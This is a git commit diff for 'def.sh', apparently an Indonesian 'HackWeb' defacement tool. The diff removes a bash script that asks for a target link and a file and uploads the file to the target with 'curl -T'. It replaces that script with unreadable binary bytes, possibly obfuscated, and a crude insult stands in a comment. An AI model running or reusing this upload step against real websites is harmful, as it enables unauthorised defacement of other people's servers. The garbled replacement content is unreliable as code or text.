9256b3a714e0e142eebda95182b8f4e1938acd4e
cyberlimit <64591373+cyberlimit@users.noreply.github.com>
2020-06-01 01:19:44 -0700

    Update def.sh

--- def.sh
+++ def.sh
@@ -1,25 +1,5 @@
 #!/bin/bash
 #yang recode kaya kontolllllllllllll
-echo -e "/e1;31mMasukan Nama Anda : "
-read nama
-figlet "HackWeb"
-echo ""
-echo -e "\e[1;35m                ##############################################"
-echo -e "\e[1;34m                |          Autor : CyberLimit"               |
-echo -e "\e[1;34m                |         My Team : wisnu|panjull"           |
-echo -e "\e[1;34m                |         youtube : Limit Official           |
-echo "                           |                                            | "
-echo -e "\e[1;34m                |         JANGAN SALAH GUNAKAN TOOLS         |
-echo -e "\e[1;35m                ##############################################"
-echo ""
-echo " Note : Hargai Yang Membuat Tools "
-echo ""
-echo -e "\e[1;36mMASUKAN LINK TARGET KAMU : "
-read target
-sleep 1
-echo -e "\e[1;35mMasukan File Kamu : "
-read file 
-sleep 2 
-echo -e "\e[1;34mPlease Wait..."
-sleep 3
-curl -T /sdcard/$target $file
+yh}f1.jf֫ygjf	^vgyhyhߙr>yw`.ɷ.)!~&3$jl"{jxW{]*..)߉Ț!!~&$FԀ,P
+8r>ywghڮa1雹Slyhyhߩ%
+4Da(杵z%yuyhߙjˤjqb⚚i%yvyh߉yf^zܺ~Oq֫_W
